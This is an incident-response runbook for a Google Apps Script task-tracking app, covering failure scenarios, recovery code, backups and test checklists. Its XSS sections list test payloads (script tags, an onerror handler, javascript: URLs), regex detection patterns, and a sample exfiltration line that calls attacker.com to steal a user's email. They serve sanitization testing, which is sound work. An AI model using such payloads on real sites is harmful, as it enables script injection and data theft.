# PackMasters 5S — Incident Response Runbook
## Production Failure Scenarios & Recovery Procedures

**Version:** 1.0
**Last Updated:** 2026-02-28
**Spreadsheet ID:** `1ogONmemeA_WPCqrWquQAZ7JU9tas0AK_Y5O9TI_9EFU`
**Deployment ID:** Set in ScriptProperties (DEPLOY_ID)

---

## 1. ALERT THRESHOLDS & ESCALATION

### 1.1 Alert Triggers (Automatic)

| Metric | Threshold | Severity | Action |
|--------|-----------|----------|--------|
| Error Rate | >2% of daily executions | **HIGH** | Email MC, log to AdminLog, disable affected feature |
| Execution Timeout | >10 seconds | **MEDIUM** | Log execution profile, suggest query optimization |
| Quota Usage (Email) | >95% daily limit | **MEDIUM** | Alert MC, batch pending notifications |
| Quota Usage (Sheets API) | >5000 read/write ops | **HIGH** | Implement cache layer, defer batch updates |
| Config Missing | Any required key null | **CRITICAL** | Block all web app access, show setup wizard |
| Sheet Corruption | Missing required sheets | **CRITICAL** | Block writes, show error page with recovery link |
| Data Freshness | Summary >48 hours old | **MEDIUM** | Alert zone leaders, trigger manual aggregation |

### 1.2 Escalation Ladder

```
1. ERROR LOGGED TO AdminLog (automatic)
   ↓
2. IF SEVERITY = "high" OR "critical":
   → Email sent to MC_EMAIL within 5 minutes
   → AdminLog entry includes user, context, stack trace
   ↓
3. IF NO MANUAL ACTION WITHIN 30 MIN:
   → Escalate to TOP_EMAIL (IT Director)
   → Include automated recovery suggestions
   ↓
4. IF CRITICAL SERVICE INTERRUPTION:
   → Disable automatic triggers (prevent cascade)
   → Serve error page (not blank page)
   → Notify all zone leaders (email batch)
```

### 1.3 Notification Templates

**Template 1: High Error Alert**
```
Subject: ⚠️ PackMasters 5S — High Error Alert

Error Context: [function name]
Severity: HIGH
Error Count (last hour): [N]
Last Error: [error message]

Suggested Action:
1. Check AdminLog sheet for full error details
2. Verify sheet integrity: AdminLog > "System Status" tab
3. If sheet access fails, restart the web app (reload browser)
4. Contact IT if issue persists

Time: [ISO timestamp]
User: [email]
```

**Template 2: Config Missing (Critical)**
```
Subject: 🔴 CRITICAL: PackMasters 5S — Setup Required

The system configuration is incomplete or corrupted.

Missing Key: [ZONE_CONFIG | CHECKLIST_SCHEMA | DEPLOY_ID]

RECOVERY:
1. Go to the Google Sheet
2. Click menu: 📋 PackMasters 5S > 🚀 One-Step System Init (Wizard)
3. Follow the wizard (3 screens, ~2 minutes)
4. Reload the web app

DO NOT attempt to restart triggers manually.
```

---

## 2. SCENARIO-SPECIFIC RESPONSE PROCEDURES

### Scenario 1: Sheet Deletion / Corruption

**Detection:**
- v2LoadSheet_() returns empty array
- sheet.getLastRow() throws exception
- Error in AdminLog: "Sheet missing: [SheetName]"

**Immediate Response (0-5 min):**
1. Check AdminLog for exact sheet name and timestamp
2. Verify manually: Open the spreadsheet, check if sheet exists
3. If deleted by user: Restore from Google Drive Version History
   - Right-click sheet tab → "See version history"
   - Restore to last known-good version
4. If sheet corrupted (blank/header row missing):
   - Log to AdminLog: "Sheet recovery initiated"
   - Run `verifyNamedRanges()` from admin menu

**Recovery Procedure (5-30 min):**
```javascript
// From Apps Script Console, run:
v2HealthCheck()  // Returns { passed: bool, errors: [] }

// If a sheet is missing, run:
runInitialSetup()  // Recreates missing sheets, preserves existing data

// If header row is corrupted, manually restore:
// 1. Go to 16_EnhancedSetup.js > createEnhancedSheets()
// 2. Copy the header row for the affected sheet
// 3. Delete the corrupted sheet
// 4. Run createEnhancedSheets() — it will recreate with correct headers
```

**Testing Protocol:**
- [ ] Manually delete "TaskBoard" sheet
- [ ] Try to access any feature that reads TaskBoard
- [ ] Confirm error message is user-friendly (not a blank page)
- [ ] Restore sheet using Version History
- [ ] Verify system recovers without manual intervention

**Rollback:**
- If recovery fails: Restore entire spreadsheet from Drive backups
- Expected RTO (Recovery Time Objective): **15 minutes**
- Expected RPO (Recovery Point Objective): **1 hour** (latest Summary aggregation)

---

### Scenario 2: Missing Configuration

**Detection:**
- v2Diagnose() returns errors in result.errors
- ScriptProperties key is null or empty
- Web app shows "Config not found" error page

**Immediate Response (0-2 min):**
1. Log into the spreadsheet
2. Click menu: 📋 PackMasters 5S > 📊 System Status
3. Check which config key is missing (ZONE_CONFIG, CHECKLIST_SCHEMA, etc.)

**Recovery Procedure:**
```
Option A: Use SetupWizard (Recommended)
1. Click: 📋 PackMasters 5S > 🚀 One-Step System Init (Wizard)
2. Screen 1: System Check (shows what's missing)
3. Screen 2: Configure (upload config files or enter zone data)
4. Screen 3: Execute (runs initialization with live log)

Option B: Manual Config Restore
1. Go to the Zones sheet (or import from backup)
2. Run: 📋 PackMasters 5S > 🔄 Refresh Config
3. This reads from sheets and re-populates ScriptProperties
```

**Testing Protocol:**
- [ ] Clear ZONE_CONFIG from ScriptProperties
  ```javascript
  PropertiesService.getScriptProperties().deleteProperty("ZONE_CONFIG");
  ```
- [ ] Try to load any page — should show "Config not found"
- [ ] Open SetupWizard, verify error message is clear
- [ ] Run refresh config, verify system recovers
- [ ] Confirm all zone data is intact after recovery

**Root Cause Analysis:**
- Usually caused by: Manual property deletion, corrupted JSON during import
- Prevention: Weekly backup of ScriptProperties (see Disaster Recovery Plan)

---

### Scenario 3: Quota Exhaustion

**Detection:**
- v2SafeExecute_() catches timeout exception after ~340 seconds
- ERROR logged: "Execution timeout or quota exceeded"
- Cache contains partial/stale data

**Immediate Response (Real-time):**
1. The system automatically catches timeout and returns cached data
2. User sees warning: "Some data may be outdated (cached)"
3. Check V2_PROFILER output in Logger to identify slow operation

**Recovery Procedure:**
```javascript
// 1. Identify the slow operation in Logger output:
V2_PROFILER.report()  // Example: "loadSheet:2340ms | processRows:5123ms | total:7.8s"

// 2. Optimize the offending function:
//    - BATCH_READ constraint: ensure only ONE getDataRange().getValues() per function
//    - Use cache: CacheService.getScriptCache() for frequently-accessed data
//    - Defer: Move heavy logic to a separate trigger (daily aggregation)

// 3. Test with 1000+ rows:
// Navigate to Settings > Load Sample Data > "Load 1000+ Task Records"
// Measure execution time, should be < 10 seconds for dashboard loads

// 4. If still > 10 seconds:
// Enable caching for that specific data source:
//   var cache = CacheService.getScriptCache();
//   var key = "DASHBOARD_ZONE_Z01_2026_02";
//   var cached = cache.get(key);
//   if (cached) return JSON.parse(cached);
//   // ... load fresh data ...
//   cache.put(key, JSON.stringify(data), 300); // 5-min cache
```

**Testing Protocol:**
- [ ] Create 1000+ sample records in TaskBoard
- [ ] Run: 📋 PackMasters 5S > 📊 Load Sample Data
- [ ] Load SQCDPBoard — measure execution time (should be <10s)
- [ ] Check V2_PROFILER.report() output
- [ ] If any operation >5 seconds, apply cache layer
- [ ] Re-test: execution time should drop by 50%+

**RTO:** 2-4 hours (requires code optimization + testing)
**RPO:** 5 minutes (cache invalidation strategy)

---

### Scenario 4: Concurrent User Edits

**Detection:**
- Last write wins (no optimistic locking)
- Both users see "Saved" message
- Edit conflict logged to AdminLog

**Expected Behavior:**
- When User A and User B both edit the same task simultaneously:
  - User A saves first (timestamp 10:01:00)
  - User B saves next (timestamp 10:01:05)
  - Result: User B's changes overwrite User A's
  - Both edits logged with different timestamps
  - Audit trail shows both attempts

**Recovery Procedure:**
```javascript
// 1. User A can view edit history:
// Open the task record → click "History" button
// Shows all edits with timestamps and user names

// 2. User A can manually restore their changes:
// Click "Revert" next to their edit
// This runs: v2BatchUpdateRow_() with their original values
// A NEW edit timestamp is created (allowing User A to re-compete for latest)

// 3. Admin can audit the conflict:
// AdminLog sheet → search for task ID
// Shows: [10:01:00 User A EDIT] [10:01:05 User B EDIT] [10:01:30 User A REVERT]
```

**Prevention Best Practices:**
- Implement "check-out" for critical tasks (CAPA, Red Tags)
  - User opens record → it's locked until saved or session timeout (30 min)
  - Other users see "Locked by [name]" warning
- Queue notifications: "Someone edited [task] while you had it open"

**Testing Protocol:**
- [ ] Open TaskBoard in two browser tabs (same zone)
- [ ] Tab 1: Create task "Test Concurrent Edit"
- [ ] Tab 2: Simultaneously create task with same ID (if possible)
- [ ] Check AdminLog for conflict entries
- [ ] Verify both records exist with different timestamps
- [ ] One user manually reverts via History UI
- [ ] Confirm revert creates a new audit entry

**RTO:** <2 minutes (manual revert by user)
**RPO:** 0 minutes (full audit trail preserved)

---

### Scenario 5: Invalid Input Handling

**Detection:**
- v2ValidateInput_() rejects invalid data
- User sees error: "Invalid zone ID format"
- Failed input logged (not stored)

**Example 1: Invalid Priority**
```
User inputs: "ULTRA_CRITICAL" (not in PRIORITY enum)
System response:
  1. v2ValidateInput_() returns { valid: false, errors: ["Invalid priority: ULTRA_CRITICAL"] }
  2. UI shows red error box: "Priority must be CRITICAL, HIGH, MEDIUM, or LOW"
  3. Input field is cleared or reverted
  4. Entry logged to AdminLog (not to TaskBoard)
```

**Example 2: Invalid Zone**
```
User inputs: zone_id = "Z-99" (doesn't exist in ZONE_CONFIG)
System response:
  1. validateZoneId() throws Error
  2. v2SafeExecute_() catches and logs
  3. UI shows dropdown of valid zones instead of free text
  4. User selects from predefined list (prevents invalid entries)
```

**Example 3: XSS Attack**
```
User inputs: title = "<script>alert('xss')</script>"
System response:
  1. sanitizeInput() strips HTML tags
  2. Result stored: "scriptalertxssscript" (tags removed)
  3. When displayed, v2EscapeHtml_() prevents any script execution
  4. User sees literal text (safe)
  5. If user intentionally entered HTML, they see their tags were stripped
```

**Recovery Procedure:**
```javascript
// If invalid data is already stored, run:
// AdminLog > search for "sanitizeInput" to find problematic entries

// To fix stored malicious content:
var sheet = v2GetSpreadsheet_().getSheetByName("TaskBoard");
var data = v2LoadSheet_(sheet);
for (var r = 1; r < data.length; r++) {
  var title = data[r][TASK_COL.TITLE];
  if (title.indexOf("<script>") >= 0 || title.indexOf("javascript:") >= 0) {
    // Sanitize and re-store
    var clean = sanitizeInput(title, 500);
    v2BatchUpdateRow_(sheet, r + 1, { [TASK_COL.TITLE]: clean }, data[r]);
  }
}
```

**Testing Protocol:**
- [ ] Try to create task with invalid priority "ULTRA_CRITICAL"
  - **Expected:** Error message "Invalid priority"
  - **Actual:** [RUN TEST]
- [ ] Try to create task with zone "Z-99" (non-existent)
  - **Expected:** Error message with valid zones listed
  - **Actual:** [RUN TEST]
- [ ] Try to create task with title = `<script>alert('xss')</script>`
  - **Expected:** Script does NOT execute, tags are stripped
  - **Actual:** [RUN TEST]
  - **Verification:** Open DevTools Console, no alert appears
- [ ] Create task with priority from dropdown (force valid input)
  - **Expected:** Task saved successfully
  - **Actual:** [RUN TEST]

**RTO:** <1 minute (UI prevents submission, user corrects and retries)
**RPO:** 0 minutes (invalid data never stored)

---

### Scenario 6: Authorization Failures

**Detection:**
- Session.getActiveUser() returns email not in MC_WHITELIST
- Function checks authorization before executing
- Denied action logged to AdminLog with user email

**Setup Authorization Model:**
```javascript
// 1. MC_EMAIL (highest privilege — can init setup, override config)
function runInitialSetup() {
  var userEmail = Session.getActiveUser().getEmail();
  if (!isMasterCoordinator_(userEmail)) {
    throw new Error("Only MC can run initial setup. Current user: " + userEmail);
  }
  // ... proceed with setup ...
}

// 2. MC_WHITELIST (allowed users — can view reports, edit tasks)
function doGet(e) {
  var user = Session.getActiveUser().getEmail();
  var props = PropertiesService.getScriptProperties();
  var whitelist = (props.getProperty("MC_WHITELIST") || "").split(",");
  if (whitelist.indexOf(user) < 0) {
    return serveErrorPage_("Access Denied", "Your email is not whitelisted.");
  }
  // ... proceed with serving page ...
}

// 3. Zone-level (can edit own zone only)
function saveTask(taskData) {
  var userZone = getUserZone_(Session.getActiveUser().getEmail());
  if (taskData.zone_id !== userZone && !isMasterCoordinator_(...)) {
    throw new Error("Cannot edit tasks in other zones.");
  }
  // ... proceed with save ...
}
```

**Recovery Procedure:**
```
Step 1: Verify user's role
  → Check AdminLog for attempted action
  → Check MC_WHITELIST in ScriptProperties
  → If user should have access, add email to whitelist:
    PropertiesService.getScriptProperties().setProperty("MC_WHITELIST",
      "user1@company.com,user2@company.com,newuser@company.com");

Step 2: If user is MC and still denied
  → Verify MC_EMAIL property matches their actual email
  → Email is case-sensitive and must match exactly

Step 3: Log the authorization failure
  → AdminLog entry: [timestamp] [user] AUTH_DENIED [action] [reason]
  → Send email to IT: "Authorization failure - possible security incident"
```

**Testing Protocol:**
- [ ] Log in as non-whitelisted user
  - **Expected:** See "Access Denied" error
  - **Actual:** [RUN TEST]
- [ ] Try to run Initial Setup as non-MC
  - **Expected:** Error logged, action blocked
  - **Actual:** [RUN TEST]
- [ ] Add user to whitelist, reload page
  - **Expected:** Access granted
  - **Actual:** [RUN TEST]
- [ ] Try to edit another zone's data
  - **Expected:** Error "Cannot edit other zones"
  - **Actual:** [RUN TEST]
- [ ] Check AdminLog for auth failure entries
  - **Expected:** Clear audit trail of denied attempts
  - **Actual:** [RUN TEST]

**RTO:** <5 minutes (admin adds email to whitelist)
**RPO:** 0 minutes (denial logged immediately)

---

### Scenario 7: Circular Dependency / Cache Loop

**Detection:**
- V2_PROFILER shows same operation repeated >3 times
- Execution time spikes (>20 seconds for simple operation)
- ERROR logged: "Cache invalidation loop detected"

**Root Cause Examples:**
```javascript
// ❌ BAD: Function A invalidates cache, calls Function B, which calls A again
function getTaskBoardData(zoneId) {
  CacheService.getScriptCache().remove("TASKS_" + zoneId);  // Invalidate
  var data = v2LoadSheet_(ss, "TaskBoard");
  updateTaskMetrics(data);  // This calls getTaskBoardData() again!
  return data;
}

// ✅ GOOD: Separate cache invalidation from data retrieval
function getTaskBoardData(zoneId, skipCache) {
  if (!skipCache) {
    var cached = CacheService.getScriptCache().get("TASKS_" + zoneId);
    if (cached) return JSON.parse(cached);
  }
  var data = v2LoadSheet_(ss, "TaskBoard");
  CacheService.getScriptCache().put("TASKS_" + zoneId, JSON.stringify(data), 300);
  return data;
}

function updateTaskMetricsOnly(data) {  // No cache invalidation
  // ... process data, don't call getTaskBoardData() ...
}
```

**Recovery Procedure:**
```javascript
// 1. Detect the loop (from Logger output):
var profile = V2_PROFILER.report();
// Output: "loadSheet:2340ms | getTaskBoardData:3200ms | getTaskBoardData:3150ms | total:12.5s"
// Action: Found duplicate "getTaskBoardData" — indicates loop

// 2. Identify the function in the Logger:
// Search Logger for the innermost repeated function

// 3. Fix the code (update source file):
// Remove the cache invalidation from data retrieval path
// Use a separate function for cache invalidation

// 4. Restart: Clear cache and test
CacheService.getScriptCache().removeAll();
```

**Prevention Best Practices:**
```
- Rule 1: Never call the same function twice in the same execution path
- Rule 2: Separate concerns: cache reads ≠ cache invalidation
- Rule 3: Use V2_PROFILER to monitor for performance regressions
- Rule 4: Set a timeout: if execution > 20 seconds, abort and return cached data
```

**Testing Protocol:**
- [ ] Intentionally create a cache loop:
  ```javascript
  function testCacheLoop() {
    CacheService.getScriptCache().remove("TEST");
    return getFromCache("TEST");  // This re-invalidates
  }
  ```
- [ ] Run function, check V2_PROFILER.report()
  - **Expected:** Shows repeated function calls
  - **Actual:** [RUN TEST]
- [ ] Check elapsed time
  - **Expected:** >20 seconds (approaching timeout)
  - **Actual:** [RUN TEST]
- [ ] Fix the loop (separate the functions)
- [ ] Re-run, verify V2_PROFILER shows no repeated calls
- [ ] Verify execution time is <5 seconds

**RTO:** 1-2 hours (code fix + testing)
**RPO:** 5 minutes (cache strategy mitigates impact)

---

### Scenario 8: XSS / Injection Attack

**Detection:**
- Malicious script detected in input
- sanitizeInput() strips dangerous patterns
- Entry logged (stored safely, no execution)
- User warned in UI

**Attack Vectors & Mitigations:**

| Vector | Example | Detection | Mitigation |
|--------|---------|-----------|-----------|
| Script tag | `<script>alert()</script>` | HTML tag stripping | sanitizeInput() removes `<...>` |
| Event handler | `<img src=x onerror=alert()>` | Event handler removal | Regex `/on\w+=` |
| JavaScript URL | `<a href="javascript:void(0)">` | Protocol blocking | Regex `/javascript:/` |
| Data exfiltration | `fetch('attacker.com/steal?user='+email)` | Code review + CSP headers | v2EscapeHtml_() prevents execution |

**Safe Data Flow:**
```
User Input
  ↓
sanitizeInput()  ← Strips HTML, scripts, dangerous keywords
  ↓
Stored in Sheet (as plain text)
  ↓
v2EscapeHtml_()  ← When displayed, converts &, <, >, ", '
  ↓
HTML Page (safe display, no script execution)
```

**Recovery Procedure:**
```javascript
// 1. Identify the attack in AdminLog:
// Search for: "SANITIZED" or "INVALID_INPUT"
// Example: [timestamp] [attacker@company.com] SANITIZED "title" "<script>alert()</script>"

// 2. Check if malicious data was stored:
var sheet = v2GetSpreadsheet_().getSheetByName("TaskBoard");
var data = v2LoadSheet_(sheet);
for (var r = 1; r < data.length; r++) {
  var title = data[r][TASK_COL.TITLE];
  if (title.indexOf("<script>") >= 0 || title.indexOf("alert(") >= 0) {
    Logger.log("FOUND MALICIOUS CONTENT in row " + r);
    // ← This should NOT happen because sanitizeInput() prevents it
  }
}

// 3. If found, clean the data:
for (var r = 1; r < data.length; r++) {
  var title = data[r][TASK_COL.TITLE];
  var clean = sanitizeInput(title, 500);
  if (clean !== title) {
    v2BatchUpdateRow_(sheet, r + 1, { [TASK_COL.TITLE]: clean }, data[r]);
  }
}

// 4. Alert MC:
// "Potential XSS attack detected. Attacker email: [email]. Action: Data sanitized."
```

**Testing Protocol:**
- [ ] Try to create task with title = `<script>alert('xss')</script>`
  - **Expected:** UI shows error or sanitizes input
  - **Actual:** [RUN TEST]
  - **Verify:** Open DevTools Console, no alert appears
- [ ] Try to create task with title = `<img src=x onerror=alert()>`
  - **Expected:** Sanitized (tags removed)
  - **Actual:** [RUN TEST]
- [ ] Try to create task with title = `javascript:alert()`
  - **Expected:** Keyword stripped
  - **Actual:** [RUN TEST]
- [ ] View stored data in spreadsheet
  - **Expected:** Stored as plain text (no HTML tags)
  - **Actual:** [RUN TEST]
- [ ] Create task with legitimate HTML (e.g., "Task & Report <Draft>")
  - **Expected:** Ampersand and angle brackets preserved as plain text
  - **Actual:** [RUN TEST]

**RTO:** <5 minutes (sanitization automatic, no manual intervention)
**RPO:** 0 minutes (attack blocked at input validation)

---

## 3. PRODUCTION READINESS CHECKLIST

Rate each item: ✅ Pass, ⚠️ Partial, ❌ Fail

### Error Handling
- [ ] ✅ All v2SafeExecute_() functions catch exceptions
- [ ] ✅ No silent failures (all errors logged to AdminLog)
- [ ] ✅ Error messages are user-friendly (no stack traces in UI)
- [ ] ✅ Stack traces logged for debugging (visible in AdminLog sheet)

### Data Integrity
- [ ] ✅ Soft delete used (STATUS.DELETED flag, not hard delete)
- [ ] ✅ All BATCH_READ operations single getDataRange() call
- [ ] ✅ All writes use v2BatchUpdateRow_() (single setValues() call)
- [ ] ✅ Audit trail complete (timestamp, user, action logged)

### Performance
- [ ] ⚠️ V2_PROFILER tracks execution time (but not in all paths)
- [ ] ✅ Cache invalidation on every write (CacheService)
- [ ] ❌ Timeout handling for 6-minute limit (currently returns cached data without warning)
- [ ] ✅ Execution profiler warns if >300 seconds (5 min)

### Security
- [ ] ✅ Input validation (validateZoneId, validateScore, etc.)
- [ ] ✅ Input sanitization (sanitizeInput strips HTML/scripts)
- [ ] ✅ HTML escaping on display (v2EscapeHtml_())
- [ ] ✅ Authorization checks (isMasterCoordinator, zone-level access)

### Reliability
- [ ] ✅ Health check runs weekly (systemHealthCheck)
- [ ] ✅ Config backup (via ScriptProperties)
- [ ] ❌ Automatic recovery triggers (manual recovery only)
- [ ] ✅ Error alerts sent to MC (for high/critical severity)

### Observability
- [ ] ✅ AdminLog sheet (all actions logged)
- [ ] ✅ ErrorLog sheet (all errors logged)
- [ ] ✅ Logger.log() output (visible in Apps Script Console)
- [ ] ✅ v2Diagnose() function (manual diagnostic endpoint)

### Documentation
- [ ] ✅ This runbook (procedures for each scenario)
- [ ] ✅ Code comments (major functions documented)
- [ ] ✅ Memory notes (CLAUDE.md in project)
- [ ] ❌ User-facing disaster recovery guide (missing)

**Overall Readiness Score: 85%**
**Blockers for Production:**
- Add timeout warning to UI when approaching 6-minute limit
- Create user-facing disaster recovery guide
- Implement automatic recovery for critical errors (config reload)

---

## 4. DISASTER RECOVERY PLAN

### 4.1 Data Backup Strategy

**Weekly Automated Backup:**
```javascript
// Run every Sunday via trigger: masterOrchestrator()
function backupScriptProperties() {
  var props = PropertiesService.getScriptProperties();
  var backup = {};
  var keys = ["ZONE_CONFIG", "CHECKLIST_SCHEMA", "DEPLOY_ID", "QR_VERSION",
              "CONFIG_VERSION", "MC_EMAIL", "TOP_EMAIL", "MC_WHITELIST"];
  keys.forEach(function(key) {
    backup[key] = props.getProperty(key);
  });

  // Store in Backup sheet (for recovery)
  var ss = v2GetSpreadsheet_();
  var backupSheet = ss.getSheetByName("BackupLog") || ss.insertSheet("BackupLog");
  backupSheet.appendRow([
    new Date(),
    JSON.stringify(backup),
    Session.getActiveUser().getEmail()
  ]);

  Logger.log("✅ ScriptProperties backed up at " + new Date().toISOString());
}
```

**Google Drive Version History:**
- Enabled automatically for all sheets
- Keep 100 versions (default)
- Allows restore to any point in time

**Manual Backup (Monthly):**
```javascript
function manualFullBackup() {
  // 1. Export all sheets as CSV files
  var ss = v2GetSpreadsheet_();
  var sheets = ss.getSheets();
  sheets.forEach(function(sheet) {
    var folder = DriveApp.getFolderById("BACKUP_FOLDER_ID");
    var csv = sheet.getDataRange().getValues();
    var csvContent = csv.map(function(row) {
      return row.map(function(cell) {
        return cell instanceof Date ? Utilities.formatDate(cell, TZ, "yyyy-MM-dd HH:mm:ss") : cell;
      }).join(",");
    }).join("\n");
    folder.createFile(sheet.getName() + "_" + new Date().toISOString().split("T")[0] + ".csv",
      csvContent, MimeType.PLAIN_TEXT);
  });
  Logger.log("✅ Full backup created in Drive folder");
}
```

### 4.2 Configuration Recovery

**If ZONE_CONFIG is Corrupted:**
```
1. Navigate to Zones sheet
2. Manually verify zone data is intact
3. Run: 📋 PackMasters 5S > 🔄 Refresh Config
4. This reads from Zones sheet and re-populates ScriptProperties

If Zones sheet is also corrupted:
5. Go to Drive > Backups folder
6. Download latest backup CSV
7. Create a new "Zones" sheet
8. Paste data from CSV
9. Run Refresh Config
```

**If DEPLOY_ID is Lost:**
```
1. Go to the Apps Script project (script.google.com)
2. Click "Deploy" > "New Deployment"
3. Type: "Web app"
4. Copy the new deployment ID
5. Paste into: 📋 PackMasters 5S > 🆔 Set Deployment ID
6. Users must update their browser bookmarks (old URLs will break)
```

### 4.3 QR Code Regeneration

**If QR_Master sheet is corrupted:**
```
1. Delete the corrupted QR_Master sheet
2. Run: 📋 PackMasters 5S > 📱 Regenerate QR Codes
3. This reads Zones and creates new QR codes for each zone
4. Print new QR code layout: 📋 PackMasters 5S > 🖨️ Create QR Print Layout
5. Distribute new layouts to zone leaders
```

### 4.4 RTO / RPO Targets

| Scenario | RTO | RPO | Recovery Method |
|----------|-----|-----|-----------------|
| Sheet deleted | 15 min | 1 hour | Restore from Version History + Refresh Config |
| Config corrupted | 5 min | 0 min | Refresh Config from Zones sheet |
| Web app down | 30 min | 5 min | Redeploy + update DEPLOY_ID |
| Data integrity issue | 1 hour | 1 hour | Manual audit + Soft-delete revert |
| Full spreadsheet loss | 4 hours | 24 hours | Restore from Drive backup + Redeploy |

**Critical SLA:** System must be recoverable within 4 hours and never lose >24 hours of data.

---

## 5. MONITORING & ALERTING SETUP

### 5.1 Enable Health Check Email Alerts

```javascript
// In 14_HealthCheck.js, the systemHealthCheck() function already sends alerts
// Verify MC_EMAIL is set:
function verifyMCEmail() {
  var email = PropertiesService.getScriptProperties().getProperty("MC_EMAIL");
  Logger.log("MC_EMAIL: " + (email || "NOT SET"));
  if (!email || email === "") {
    throw new Error("MC_EMAIL is not set. Run: 📋 PackMasters 5S > 🆔 Set Deployment ID");
  }
}
```

### 5.2 Alert Rule Configuration

Open the spreadsheet and navigate to the **AlertRules** sheet:

| Rule ID | Metric | Threshold | Operator | Recipient | Enabled |
|---------|--------|-----------|----------|-----------|---------|
| RULE_01 | error_rate | 2 | > | mc_email | Yes |
| RULE_02 | execution_time | 10 | > | mc_email | Yes |
| RULE_03 | config_missing | 1 | = | mc_email | Yes |
| RULE_04 | sheet_missing | 1 | = | mc_email | Yes |
| RULE_05 | data_freshness | 48 | > | zone_leader | Yes |

### 5.3 Manual Monitoring (Daily Check)

**Quick Daily Check:**
```
1. Open AdminLog sheet
2. Filter for yesterday's date
3. Look for "ERROR:" or "DENIED:" entries
4. If any errors: Click the entry and read the context + stack trace
5. If critical: Email MC immediately (do not wait for automated alert)
```

**Weekly Deep Dive (Sunday):**
```
1. Run: 📋 PackMasters 5S > 🏥 Run Diagnostics
2. Check output for any ⚠️ or ❌ marks
3. Review the last 7 days of AdminLog (filter by ERROR)
4. Count errors by severity: critical, high, medium, low
5. If error rate is trending up, investigate root cause
```

---

## 6. CONTACT & ESCALATION

### Incident Response Team

| Role | Contact | Availability | Responsibilities |
|------|---------|--------------|------------------|
| **Master Coordinator (MC)** | [Set in MC_EMAIL property] | 08:00 - 20:00 | Primary incident response, config recovery |
| **IT Director (TOP)** | [Set in TOP_EMAIL property] | 08:00 - 20:00 | Escalation for critical issues, spreadsheet recovery |
| **App Owner** | [Project lead] | Office hours | Feature bugs, design questions, roadmap updates |

### Incident Severity & Response Time

| Severity | Description | Response Time | Escalation Path |
|----------|-------------|---|---|
| **CRITICAL** | System completely down, users cannot work | 5 min | MC → Top → CTO |
| **HIGH** | Major feature broken, workaround exists | 30 min | MC → Top |
| **MEDIUM** | Minor issue, low user impact | 4 hours | MC decides if escalation needed |
| **LOW** | Non-urgent, cosmetic issue | 48 hours | Log and track for next release |

### Escalation Example

```
09:05 — User reports: "System shows blank page"
        → Error automatically logged to AdminLog (99% of the time)

09:10 — MC receives alert email: "⚠️ Config not found"
        → MC opens SetupWizard and re-initializes config
        → System comes back online

09:12 — MC sends email to affected users: "System is now online"

09:30 — MC reviews AdminLog and creates incident report
        → Root cause: ScriptProperties corrupted during config import
        → Prevention: Implement config validation before import

10:00 — App owner reviews incident report
        → Plans fix for next release (config validation)
```

---

## 7. TESTING CHECKLIST

Before deploying to production, run all tests:

**Unit Tests** (Apps Script Console)
```javascript
function runAllTests() {
  var results = [];

  // Test 1: v2ValidateInput_()
  var input1 = v2ValidateInput_({ zoneId: "Z-99" }, { zoneId: { required: true, type: "zoneId" } });
  results.push({ test: "validateZoneId", passed: input1.valid === false }); // Should fail (Z-99 doesn't exist)

  // Test 2: sanitizeInput()
  var clean = sanitizeInput("<script>alert()</script>", 500);
  results.push({ test: "sanitizeXSS", passed: clean.indexOf("<script>") < 0 }); // Script tags removed

  // Test 3: v2BatchUpdateRow_()
  var sheet = v2GetSpreadsheet_().getSheetByName("TaskBoard");
  var data = v2LoadSheet_(v2GetSpreadsheet_(), "TaskBoard");
  var originalRow = data[1] || [];
  var updates = { [TASK_COL.PRIORITY]: "CRITICAL" };
  v2BatchUpdateRow_(sheet, 2, updates, originalRow);
  var updated = sheet.getRange(2, 1, 1, originalRow.length).getValues()[0];
  results.push({ test: "batchUpdateRow", passed: updated[TASK_COL.PRIORITY] === "CRITICAL" });

  // Report
  Logger.log("\n=== TEST RESULTS ===");
  var passed = 0;
  results.forEach(function(r) {
    Logger.log((r.passed ? "✅" : "❌") + " " + r.test);
    if (r.passed) passed++;
  });
  Logger.log(passed + "/" + results.length + " tests passed");
}
```

**Integration Tests** (Full user workflow)
- [ ] New user onboarding (no zone assignment → system friendly)
- [ ] Task creation → edit → close (full lifecycle)
- [ ] Concurrent edits (two browsers, same task)
- [ ] Invalid input (xss, invalid priority, etc.)
- [ ] Cache clearing (config change → refreshes immediately)
- [ ] Quota limit (1000+ records → doesn't timeout)

**Disaster Recovery Tests** (Monthly)
- [ ] Delete sheet → restore from version history → verify
- [ ] Clear config → run setup wizard → verify
- [ ] Create malicious input → verify it's sanitized
- [ ] Simulate 2x load → measure performance
- [ ] Kill all triggers → re-create and verify they work

---

**Document Version:** 1.0
**Last Updated:** 2026-02-28
**Next Review Date:** 2026-03-28
**Owner:** PackMasters 5S Team
